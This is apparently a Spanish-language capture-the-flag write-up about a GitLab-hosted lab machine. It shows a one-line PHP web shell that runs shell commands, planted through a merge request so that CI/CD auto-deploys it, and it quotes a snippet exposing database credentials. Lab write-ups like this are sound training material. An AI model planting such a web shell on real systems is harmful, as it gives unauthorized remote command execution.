## Vulnerability Assessment {-}


### Gitlab {-}

Como hemos podido connectarnos, analyzamos el contenido del gitlab. 
Vemos que hay 2 repositorios. En el menu Activity vemos cosas interessante como una especie de **CI/CD** que permite
tras una merge request updatear el proyecto *Profile* automaticamente. Ademas la routa `/profile` estaba ocultada por el
**robots.txt**.

En el menu Snippets vemos un codigo php

```php
<?php
$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
$result = pg_query($db_connection, "SELECT * FROM profiles");
```

#### Subimos un archivo php que nos permite ejecutar comandos {-}

Creamos un archivo `s4vishell.php` en el proyecto profile.

```php
<?php
    echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>';
?>
```

Hacemos un commit con este fichero y se nos crea una rama diferente de la **master** lo que significa que tenemos que crear una **Merge request**.
Una vez esta **Merge Request** creada, Vemos que la podemos acceptar sin problemas porque el proyecto nos apartenece.

Si vamos a la url `http://10.10.10.114/profile/s4vishell.php?cmd=whoami` Vemos que tenemos possibilidad de ejecutar comandos a nivel de systema.
